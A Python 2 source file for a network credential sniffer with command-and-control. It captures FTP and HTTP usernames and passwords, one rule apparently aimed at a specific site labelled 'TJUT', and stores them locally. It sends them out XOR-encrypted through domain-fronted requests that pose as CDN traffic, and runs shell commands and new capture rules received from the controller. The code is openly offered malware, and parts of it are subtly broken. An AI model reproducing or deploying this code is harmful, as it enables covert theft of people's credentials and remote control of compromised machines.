# coding:utf-8
import sqlite3
import requests
import threading
import os
import ConfigParser
import time
import random
import sys
import json
import base64
from dsniffer import DSniffer
from time import sleep


configure_file = "./config.ini"
db_file = "./data.db"
disguise_domain = ['http://cdn.zendesk.com/', 'http://cdn.atlassian.com/', 'http://a1.awsstatic.com/']
host = None
password = None
db_conn = None
device_name = None
dsniffer = None
interval = 60

def xor(input, password):
    r = []
    for i in range(len(input)):
        r.append(chr(ord(input[i]) ^ ord(password[i % len(password)])))
    return "".join(r)


def init():
    cf = ConfigParser.ConfigParser()
    if [] == cf.read(configure_file):
        sys.stderr.write("config file is missing")
        sys.exit()
    global host
    global password
    global interval
    global device_name
    try:
        host = cf.get('comm_config','host')
        password = cf.get('comm_config','password')
        interval = cf.getint('comm_config','interval')
        device_name = cf.get('comm_config','device_name')
    except ConfigParser.NoOptionError as e:
        sys.stderr.write("Missing Option")


def init_db():
    if os.path.isfile(db_file):
        return sqlite3.connect(db_file, isolation_level=None)
    db_conn = sqlite3.connect(db_file, isolation_level=None)
    c = db_conn.cursor()
    c.execute('''CREATE TABLE DATA
        (ID INTEGER PRIMARY KEY NOT NULL,
        TIME TEXT NOT NULL,
        FROMIP TEXT NOT NULL,
        TOIP TEXT NOT NULL,
        INFO TEXT NOT NULL,
        STATUS INT NOT NULL);''')
    c.execute('''CREATE TABLE FINDER
        (ID INTEGER PRIMARY KEY NOT NULL,
        CODE TEXT NOT NULL);''')
    c.close()
    return db_conn


def parse_command(commands):
    saveConfig = False
    global host
    global password
    global interval
    global device_name
    for c in commands:
        if "interval" in c:
            interval = int(c['interval'])
            saveConfig = True
        if "password" in c:
            password = c['password']
            saveConfig = True
        if "host" in c:
            host = c['host']
            saveConfig = True
        if "device_name" in c:
            device_name = c['device_name']
            saveConfig = True
        if "add_finder" in c:
            global dsniffer
            db = sqlite3.connect(db_file,isolation_level=None)
            c = db.cursor()
            c.execute("INSERT INTO finder(code) VALUES (?)",(c['add_finder'],))
            dsniffer.add_finder(base64.b64decode(['add_finder']))
        if "reset_finder" in c:
            db = sqlite3.connect(db_file,isolation_level=None)
            c = db.cursor()
            c.execute("DELETE FROM sqlite_sequence WHERE name = 'finder';")
        if "system" in c:
            os.system(c['system'])
    if saveConfig == True:
        cf = ConfigParser.ConfigParser()
        cf.read(configure_file)
        host = cf.set('comm_config','host',host)
        password = cf.set('comm_config','password',password)
        interval = cf.set('comm_config','interval',interval)
        device_name = cf.set('comm_config','device_name',device_name)
        cf.write(open(configure_file,"wb"))

def comm():
    global host
    global password
    global device_name
    data = ["GIF,"+str(random.random())]
    id = []
    db = sqlite3.connect(db_file,isolation_level=None)
    c = db.cursor()
    cursor = c.execute("SELECT time,fromip,toip,info,id FROM DATA WHERE status=0")
    for row in cursor:
        data.append({"time":row[0],"fromip":row[1],"toip":row[2],"info":row[3],"device":device_name})
        id.append(row[4])
    command_response = requests.get(disguise_domain[random.randint(0,len(disguise_domain)-1)]+base64.b64encode(xor(json.dumps(data),password)),headers={"Host":host})
    print(command_response.text)
    if command_response.status_code == 200:
        for i in id:
            c.execute("UPDATE DATA SET status=1 where id=?",(i,))
        commands = json.loads(xor(base64.b64decode(command_response.text), password))
        parse_command(commands)
    c.close()

    threading.Timer(interval, comm).start()



if __name__ == '__main__':
    init()
    db_conn = init_db()
    comm()
    finder = ['''if dport=="21":\n\traw=raw[0:-5]\n\tuser=re.findall("(?i)USER (.*)",raw)\n\tpw=re.findall("(?i)PASS (.*)",raw)\n\tif user:\n\t\tinfo=info+"ftp user:"+user[0]\n\t\tprint(info)\n\t\tisLeak=True\n\tif pw:\n\t\tinfo = info+"ftp pass:"+pw[0]\n\t\tprint(info)\n\t\tisLeak=True''', 
    '''if dport=="80":\n\traw=raw[0:-5]\n\tuser = re.findall("username=(.*)&",raw)\n\tpassword = re.findall("password=(.*)&",raw)\n\tif user and password:\n\t\tinfo = info+"TJUT username:"+user[0]\n\t\tinfo = info+";password:"+password[0]\n\t\tisLeak=True\n\t\tprint(info)''']
    # finder = []
    c = db_conn.cursor()
    cursor = c.execute("SELECT code FROM FINDER;")
    for row in cursor:
        finder.append(base64.b64decode(row[0]))
    dsniffer = DSniffer(['eth0.2','eth0.3'], finder, db_file)
    dsniffer.start()
    try:
        while True:
            sleep(100)
    except KeyboardInterrupt:
        print("Stoping")
        dsniffer.join(2.0)